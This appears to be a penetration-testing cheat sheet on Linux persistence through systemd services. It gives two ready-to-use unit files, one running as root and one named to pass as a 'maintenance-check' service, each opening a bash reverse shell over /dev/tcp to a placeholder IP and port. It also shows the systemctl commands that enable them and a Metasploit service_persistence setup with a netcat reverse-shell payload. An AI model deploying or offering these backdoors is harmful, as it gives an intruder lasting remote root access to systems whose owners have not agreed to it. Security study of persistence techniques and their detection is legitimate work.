# Service Daemon Backdoor

## 01 - Unix Shell

`$ cd /etc/systemd/system/`

`$ cat maintenance-check.service`

---

```
[Unit]
Description=Backdoor service

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >&/dev/tcp/<IP>/<PORT> 0>&1'
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
```

- Reload all daemon services

```
$ sudo systemctl daemon-reload

$ sudo systemctl enable maintenance-check.service
```

`$ cat rooted-backdoor.service`

---

```
[Unit]
Description=Backdoor service

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >&/dev/tcp/<IP>/<PORT> 0>&1'
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
```

```
$ sudo systemctl daemon-reload

$ sudo systemctl enable rooted-backdoor.service
```

## 02 - Metasploit

```
msf > use exploit/linux/local/service_persistence

msf exploit(linux/local/service_persistence) > options

Module options (exploit/linux/local/service_persistence):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   SERVICE                      no        Name of service to create
   SESSION                      yes       The session to run this module on
   SHELLPATH   /usr/local/bin   yes       Writable path to put our shell
   SHELL_NAME                   no        Name of shell file to write


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf exploit(linux/local/service_persistence) > set shellpath </usr/local/bin | /usr/bin>

msf exploit(linux/local/service_persistence) > set service <service_name>

msf exploit(linux/local/service_persistence) > set shell_name <program_name>

msf exploit(linux/local/service_persistence) > set lhost <IP>

msf exploit(linux/local/service_persistence) > set lport <PORT>

msf exploit(linux/local/service_persistence) > set session <session_id>

msf exploit(linux/local/service_persistence) > run
```

## References

- [Linux Backdoors and Where to Find Them](https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/)